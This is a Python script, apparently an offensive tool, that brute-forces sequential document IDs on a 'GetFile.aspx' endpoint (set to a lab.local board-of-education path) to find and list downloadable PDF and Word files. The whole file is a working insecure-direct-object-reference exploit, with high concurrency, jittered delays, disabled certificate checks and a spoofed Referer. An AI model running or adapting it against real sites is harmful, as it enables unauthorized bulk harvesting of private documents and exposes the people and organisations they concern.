#!/usr/bin/env python3

import asyncio
import httpx
from pathlib import Path
from datetime import datetime
import random
import os
import sys

LOGO = r"""

          (    (           (     
   (      )\ ) )\ )        )\ )  
   )\    (()/((()/(   (   (()/(  
((((_)(   /(_))/(_))  )\   /(_)) 
 )\ _ )\ (_)) (_))_  ((_) (_))   
 (_)_\(_)|_ _| |   \ | __|/ __|  
  / _ \   | |  | |) || _| \__ \  
 /_/ \_\ |___| |___/ |___||___/  
                                  A S Y N C   I D   B R U T E F I L E   S C A N N E R
                                  B Y K L 3 F T 3 Z 
"""

def banner():
    # Очистка экрана
    os.system("cls" if os.name == "nt" else "clear")
    print(LOGO)
    print("Async ID Brutefile Scanner — https://github.com/toxy4ny\n")

# Конфигурация
TARGET      = "https://lab.local/boardofeducation/GetFile.aspx"
START, STOP = 30000, 40000
CONCURRENCY = 50
TIMEOUT     = 10
OUTFILE     = Path("found_links.txt")

MIN_SIZE = 4 * 1024
MIME_ALLOW = {
    "application/pdf",
    "application/vnd.openxmlformats-officedocument.wordprocessingml.document",
    "application/msword"
}

sem = asyncio.Semaphore(CONCURRENCY)

async def probe(client: httpx.AsyncClient, doc_id: int):
    await asyncio.sleep(random.uniform(0, 0.25)) 
    url = f"{TARGET}?id={doc_id}"
    async with sem:
        try:
            r = await client.get(url, timeout=TIMEOUT, follow_redirects=True)
        except (httpx.RequestError, httpx.TimeoutException):
            return False

    
    if r.status_code not in (200, 206):
        return False
    if int(r.headers.get("Content-Length", 0)) < MIN_SIZE:
        return False

    ctype = r.headers.get("Content-Type", "").split(";", 1)[0].lower()
    if ctype not in MIME_ALLOW:
        return False

    with open(OUTFILE, "a", encoding="utf8") as f:
        f.write(f"{url}\n")
    print(f"[+] {url} ({ctype}, {len(r.content)//1024} KB)")
    return True

async def main():
    banner()

    OUTFILE.unlink(missing_ok=True)

    async with httpx.AsyncClient(verify=False, headers={
        "User-Agent": "Mozilla/5.0 (BrutefileScanner)",
        "Referer": TARGET
    }) as client:
        tasks = [probe(client, i) for i in range(START, STOP)]
        await asyncio.gather(*tasks)

    print(f"\n{datetime.now():%H:%M:%S} – Scanning is Done!")
    print(f"Find URLs: {sum(1 for _ in open(OUTFILE))}")

if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        print("\n[!] Breaking users") 
        sys.exit(0)
